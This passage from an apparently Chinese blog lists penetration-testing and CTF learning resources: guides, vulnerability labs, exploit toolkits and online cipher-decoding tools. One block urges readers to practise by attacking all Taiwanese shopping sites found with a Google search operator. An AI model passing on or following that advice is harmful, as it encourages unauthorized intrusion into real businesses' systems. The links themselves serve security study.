3）渗透测试入门指南与路线规划<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgitbook.cn%2Fgitchat%2Factivity%2F5c303ffe2a982d27f48994d9" target="_blank" rel="noopener">https://gitbook.cn/gitchat/activity/5c303ffe2a982d27f48994d9</a><br> 4）全新CTF，内网渗透，web安全教程上线<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FukSra269UmRhXYxvsbshng" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ukSra269UmRhXYxvsbshng</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhanc00l%2Fwooyun_public" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_public</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Ffindneo.github.io%2F180308NewbieSecurityList" target="_blank" rel="noopener">https://findneo.github.io/180308NewbieSecurityList</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDropsOfZut%2Fawesome-security-weixin-official-accounts" target="_blank" rel="noopener">https://github.com/DropsOfZut/awesome-security-weixin-official-accounts</a></p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ffindneo%2FNewbie-Security-List" target="_blank" rel="noopener">https://github.com/findneo/Newbie-Security-List</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Feuphrat1ca%2Ffuzzdb-collect" target="_blank" rel="noopener">https://github.com/euphrat1ca/fuzzdb-collect</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove%2Fhandbook" target="_blank" rel="noopener">https://github.com/jaywcjlove/handbook</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove" target="_blank" rel="noopener">https://github.com/jaywcjlove</a><br> 内网渗透<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-48179-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-48179-1-1.html</a><br> k8工具<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools" target="_blank" rel="noopener">https://github.com/truongkma/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FP1kachu%2Fv0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools" target="_blank" rel="noopener">https://github.com/TUCTF/Tools</a><br> <strong>ACM</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1vo-frs9RypuRFCX3WheNxw" target="_blank" rel="noopener">https://pan.baidu.com/s/1vo-frs9RypuRFCX3WheNxw</a>密码:ugcs<br> 一些工具<br> <strong>博客</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fimpakho.com%2F" target="_blank" rel="noopener">https://impakho.com/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fevoa.me%2F" target="_blank" rel="noopener">https://evoa.me/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbestwing.me%2F%23" target="_blank" rel="noopener">https://bestwing.me/#</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fcyto.top%2F" target="_blank" rel="noopener">https://cyto.top/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpupiles.com%2F" target="_blank" rel="noopener">http://pupiles.com/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fsp4rk.cn%2Findex.php%2Fpage%2F1" target="_blank" rel="noopener">http://sp4rk.cn/index.php/page/1</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fskysec.top%2F" target="_blank" rel="noopener">https://skysec.top/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cjhsunny.xyz%2F" target="_blank" rel="noopener">https://www.cjhsunny.xyz/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fveritas501.space%2F" target="_blank" rel="noopener">https://veritas501.space/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2F" target="_blank" rel="noopener">http://gv7.me/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fmannix.top%2F" target="_blank" rel="noopener">http://mannix.top/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.15qq.cn%2Fsort%2Fbug_poc" target="_blank" rel="noopener">https://www.15qq.cn/sort/bug_poc</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vxia.net%2F" target="_blank" rel="noopener">http://www.vxia.net/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.chinacycc.com%2Fforum.php%3Fmobile%3Dyes" target="_blank" rel="noopener">https://www.chinacycc.com/forum.php?mobile=yes</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgetpass.cn%2F" target="_blank" rel="noopener">https://getpass.cn/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Flengjibo.github.io%2Fphp%E9%BB%91%E9%AD%94%E6%B3%95%2F" target="_blank" rel="noopener">https://lengjibo.github.io/php%E9%BB%91%E9%AD%94%E6%B3%95/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.admintony.com%2F%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">http://www.admintony.com/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FNationalSecurityAgency" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FYadominJinta%2Fatilo%2Fblob%2Fmaster%2FCN%2FREADME_CN.md" target="_blank" rel="noopener">https://github.com/YadominJinta/atilo/blob/master/CN/README_CN.md</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-49370-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-49370-1-1.html</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.certilience.fr%2F2019%2F03%2Ftomcat-exploit-variant-host-manager%2F-" target="_blank" rel="noopener">https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/-</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.giantbranch.cn%2Farchives%2F" target="_blank" rel="noopener">https://www.giantbranch.cn/archives/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fc1h2e1.github.io%2F%3Ftitle%3ARPO" target="_blank" rel="noopener">https://c1h2e1.github.io/?title:RPO</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fptriker.github.io%2F%3Fnsukey%3Di5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D" target="_blank" rel="noopener">https://ptriker.github.io/?nsukey=i5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTY5NzI2Mw%3D%3D%26mid%3D2247484108%26idx%3D1%26sn%3D2eb978edf55dbb22e3cee6bc06817605%26chksm%3Deb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61%26xtrack%3D1%26scene%3D0%26subscene%3D131%26clicktime%3D1555484172%26ascene%3D7%26devicetype%3Dandroid-27%26version%3D2700033c%26nettype%3Dcmnet%26abtest_cookie%3DBAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA%26lang%3Dzh_CN%26pass_ticket%3DaI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ%26wx_header%3D1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI3MTY5NzI2Mw==&amp;mid=2247484108&amp;idx=1&amp;sn=2eb978edf55dbb22e3cee6bc06817605&amp;chksm=eb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1555484172&amp;ascene=7&amp;devicetype=android-27&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=aI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ&amp;wx_header=1</a><br> 域渗透<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fstart.me%2Fp%2FX20Apn" target="_blank" rel="noopener">https://start.me/p/X20Apn</a><br> LiveOverflow-YouTube</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.youtube.com%2Fchannel%2FUClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fvipread.com%2Findex" target="_blank" rel="noopener">http://vipread.com/index</a>这里面有些信息收集的ppt�</p><p>POC编写指南<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html" target="_blank" rel="noopener">https://poc.evalbug.com/chapter1/1.html</a><br> CTF入门指南<br> 新手的渗透学习流程：<br> 1、有哪些漏洞需要了解？<br> SQL注入、XSS、上传、csrf、xsrf、ssrf、crlf、xxe、url跳转、任意文件下载（读取）、弱口令、暴库、信息泄露、<br> 域传送、跨域（cors、jsonp、crossdomain）、反序列化、远程命令执行、拒绝服务、配置错误等等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">逻辑：任意用户注册（登录、密码重置），支付漏洞，劫持，参数污染，条件竞争等等</span><br><span class="line">cms漏洞：phpcms，dedecms，discuz、drupal、wordpress、spring、struts2、jboss、weblogic、joomla、jenkins等等</span><br><span class="line">端口漏洞：elasticsearch、samba、redis、mongodb、zookeeper、memcache、hadoop、couchdb、ldap、rsync等等</span><br><span class="line">FUZZ字典（CRLF、jsonp、ua、url、xss、xxe、rce、dir、upload、sql、name、password）等等</span><br></pre></td></tr></table></figure><p>2、学习地址？<br> 各种漏洞                                        <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwiki.chamd5.org%2F" target="_blank" rel="noopener">http://wiki.chamd5.org/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FJnuSimba%2FMiscSecNotes" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes</a><br> web漏洞总结                                     <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning</a><br> 乌云镜像<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.madebug.net%2F" target="_blank" rel="noopener">https://www.madebug.net/</a>                                        <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwooyun.shuimugan.com%2F" target="_blank" rel="noopener">https://wooyun.shuimugan.com/</a><br> cms漏洞                                           <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FLucifer1993%2FAngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a><br> 国外漏洞                                        <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpentester.land%2Flist-of-bug-bounty-writeups.html%23bug-bounty-writeups-published-in-2019" target="_blank" rel="noopener">https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2019</a><br> 更多学习地址尽在内部群</p><p>3、靶场<br> 靶场：                                         <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.freebuf.com%2Fsectool%2F4708.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/4708.html</a><br> 漏洞靶场，docker搭建，有些靶场内附py文件        <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FMedicean%2FVulApps%2F" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fvulapps.evalbug.com%2F" target="_blank" rel="noopener">http://vulapps.evalbug.com/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2FCMS-Hunter" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fklionsec%2FPhishingExploit" target="_blank" rel="noopener">https://github.com/klionsec/PhishingExploit</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vulnspy.com%2F" target="_blank" rel="noopener">http://www.vulnspy.com/</a><br> 上传漏洞靶场：                                 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fupload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a><br> XXE漏洞靶场：                                    <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fxxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a><br> 一键搭建12个漏洞平台                         <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fvulstudy" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy</a><br> 各类型漏洞靶场                                 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgh0stkey%2FDoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a><br> AWD环境搭建<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fjjhpkcr.xyz%2F2019%2F04%2F29%2Fawd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%2F%3Fnsukey%3DkcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D" target="_blank" rel="noopener">http://jjhpkcr.xyz/2019/04/29/awd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/?nsukey=kcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D</a></p><p>4、如何学习<br> 多逛论坛：i春秋、吐司、90等等<br> 多看大佬博客<br> 和志同道合的小伙伴一起挖洞</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">想实战检验自己的学习成果，就去把台湾的所有商城网站挖一遍。谷歌语法<span class="selector-pseudo">:site</span>:*<span class="selector-class">.tw</span>商城</span><br><span class="line">挖完了所有商城网站，可以去挖各大<span class="selector-tag">SRC</span>。</span><br></pre></td></tr></table></figure><p>如何入门？如何组队？</p><p>capturetheflag夺旗比赛</p><p>类型：</p><p>Web<br> 密码学<br> xssee:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p><p>xssee:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fevilcos.me%2Flab%2Fxssee" target="_blank" rel="noopener">http://evilcos.me/lab/xssee</a></p><p>(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftool.chacuo.net%2Fcryptdes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptdes</a></p><p>在线编码解码(多种并排):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fbianma.911cha.com" target="_blank" rel="noopener">http://bianma.911cha.com</a></p><p>在线加密解密(多种):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fencode.chahuo.com" target="_blank" rel="noopener">http://encode.chahuo.com</a></p><p>Unicode转中文:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Funicode_chinese" target="_blank" rel="noopener">http://www.bejson.com/convert/unicode_chinese</a></p><p>栅栏密码&amp;&amp;凯撒密码&amp;&amp;摩斯电码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fheartsnote.com%2Ftools%2Fcipher.htm" target="_blank" rel="noopener">http://heartsnote.com/tools/cipher.htm</a></p><p>Caesarcipher(凯撒密码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F1434%2F" target="_blank" rel="noopener">http://planetcalc.com/1434/</a></p><p>Quoted-Printable&amp;&amp;ROT13:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.mxcz.net%2Ftools%2FQuotedPrintable.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></p><p>ROT5/13/18/47编码转换:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2FROT5-13-18-47.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p><p>Base32/16:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpbaseconverter.com%2F" target="_blank" rel="noopener">http://pbaseconverter.com/</a></p><p>Base32:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Ftools.deamwork.com%2Fcrypt%2Fdecrypt%2Fbase32decode.html" target="_blank" rel="noopener">https://tools.deamwork.com/crypt/decrypt/base32decode.html</a></p><p>quipqiup古典密码自动化爆破(词频分析):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fquipqiup.com%2Findex.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a></p><p>词频分析/替换:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcryptoclub.org%2Ftools%2Fcracksub_topframe.php" target="_blank" rel="noopener">http://cryptoclub.org/tools/cracksub_topframe.php</a></p><p>‘+.&lt;&gt;[]’&amp;&amp;’!.?’(Brainfuck/Ook!):<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.splitbrain.org%2Fservices%2Fook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><p>‘+-.&lt;&gt;[]’(Brainfuck):<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.nayuki.io%2Fpage%2Fbrainfuck-interpreter-javascript" target="_blank" rel="noopener">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a></p><p>‘+-.&lt;&gt;[]’(Brainfuck):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fesoteric.sange.fi%2Fbrainfuck%2Fimpl%2Finterp%2Fi.html" target="_blank" rel="noopener">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p><p>‘()[]!+’JavaScript编码(JSfuck):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdiscogscounter.getfreehosting.co.uk%2Fjs-noalnum.php" target="_blank" rel="noopener">http://discogscounter.getfreehosting.co.uk/js-noalnum.php</a></p><p>用6个字符’()[]!+’来编写JavaScript程序(JSfuck同上):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jsfuck.com%2F" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpatriciopalladino.com%2Ffiles%2Fhieroglyphy%2F" target="_blank" rel="noopener">http://patriciopalladino.com/files/hieroglyphy/</a></p><p>摩斯密码翻译器:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jb51.net%2Ftools%2Fmorse.htm" target="_blank" rel="noopener">http://www.jb51.net/tools/morse.htm</a></p><p>MorseCode摩尔斯电码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2Fmorse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a></p><p>摩尔斯电码转换器:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhongguosou.com%2Fzonghe%2FmoErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>字符串编码，解码，转换(长度,反转,进制转换):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.5ixuexiwang.com%2Fstr%2F" target="_blank" rel="noopener">http://www.5ixuexiwang.com/str/</a></p><p>CiscoType7Reverser:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpacketlife.net%2Ftoolbox%2Ftype7" target="_blank" rel="noopener">http://packetlife.net/toolbox/type7</a></p><p>Cisco:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ifm.net.nz%2Fcookbooks%2Fpasswordcracker.html" target="_blank" rel="noopener">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a></p><p>cmd5&amp;&amp;NTLM&amp;&amp;mysql…:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com" target="_blank" rel="noopener">http://www.cmd5.com</a></p><p>spammimic(字符2一段话):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.spammimic.com%2F" target="_blank" rel="noopener">http://www.spammimic.com/</a></p><p>js代码在线加密解密:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fjs%2F" target="_blank" rel="noopener">https://tool.lu/js/</a></p><p>JScript/VBscript脚本解密(#@^….^#@):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dheart.net%2Fdecode%2Findex.php" target="_blank" rel="noopener">http://www.dheart.net/decode/index.php</a></p><p>VBScript.Encode解密(<a href="https://links.jianshu.com/go?to=tip%3AAspencode" target="_blank" rel="noopener">tip:Aspencode):http://adophper.com/encode.html</a>%3Ahttp%3A%2F%2Fadophper.com%2Fencode.html)</p><p>JScript.Encode脚本加密与解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.haokuwang.com%2Fjsendecode.htm" target="_blank" rel="noopener">http://www.haokuwang.com/jsendecode.htm</a></p><p>‘+/v+’UTF-7加密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p><p>各种无知密码解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tools88.com" target="_blank" rel="noopener">http://www.tools88.com</a></p><p>uuencode解码&amp;&amp;xxencode解码(古老的邮件密码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></p><p>MIME标准(邮件编码的一种):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdogmamix.com%2FMimeHeadersDecoder%2F" target="_blank" rel="noopener">http://dogmamix.com/MimeHeadersDecoder/</a></p><p>Binhex编码(邮件编码的一种,常见于MAC机):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fencoders-decoders.online-domain-tools.com%2F" target="_blank" rel="noopener">http://encoders-decoders.online-domain-tools.com/</a></p><p>%u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb.chacuo.net%2Fcharsetescape" target="_blank" rel="noopener">http://web.chacuo.net/charsetescape</a></p><p>猪圈密码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.simonsingh.net%2FThe_Black_Chamber%2Fpigpen.html" target="_blank" rel="noopener">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></p><p>ppencode(把Perl代码转换成只有英文字母的字符串):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnamazu.org%2F~takesako%2Fppencode%2Fdemo.html" target="_blank" rel="noopener">http://namazu.org/~takesako/ppencode/demo.html</a></p><p>aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Futf-8.jp%2Fpublic%2Faaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p><p>‘()[]!+’&amp;&amp;’$=~[]+”_.();’jother编码jjencode(JS代码转换成只有符号的字符串):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fweb2hack.org%2Fxssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p><p>jother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：!+()[]{}。只用这些字符就能完成对任意字符串的编码）:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftmxk.org%2Fjother%2F" target="_blank" rel="noopener">http://tmxk.org/jother/</a></p><p>jjencode/aaencode可用xssee&amp;&amp;Chrome的Console模式来直接输出解密。</p><p>Manchester曼彻斯特解密：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Feleif.net%2Fmanchester.html" target="_blank" rel="noopener">http://eleif.net/manchester.html</a></p><p>Vigenère维多利亚解密：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.guballa.de%2Fvigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p><p>Vigenèrecipher:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F2468%2F" target="_blank" rel="noopener">http://planetcalc.com/2468/</a></p><p>Hillcipher(希尔密码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F3327%2F" target="_blank" rel="noopener">http://planetcalc.com/3327/</a></p><p>Atbashcipher(埃特巴什码):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fplanetcalc.com%2F4647%2F" target="_blank" rel="noopener">http://planetcalc.com/4647/</a></p><p>snow(html隐写):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ffog.misty.com%2Fperry%2Fccs%2Fsnow%2Fsnow%2Fsnow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p><p>Serpent加密解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fserpent.online-domain-tools.com%2F" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p>十六进制Hex转文本字符串:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com%2Fconvert%2Fox2str%2F" target="_blank" rel="noopener">http://www.bejson.com/convert/ox2str/</a></p><p>Hex2text:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.convertstring.com%2FEncodeDecode%2FHexDecode" target="_blank" rel="noopener">http://www.convertstring.com/EncodeDecode/HexDecode</a></p><p>Binary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.binaryhexconverter.com%2F" target="_blank" rel="noopener">http://www.binaryhexconverter.com/</a></p><p>集合:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fdaohang.htm" target="_blank" rel="noopener">http://www.qqxiuzi.cn/daohang.htm</a></p><p>集合（各种古典密码）:<a 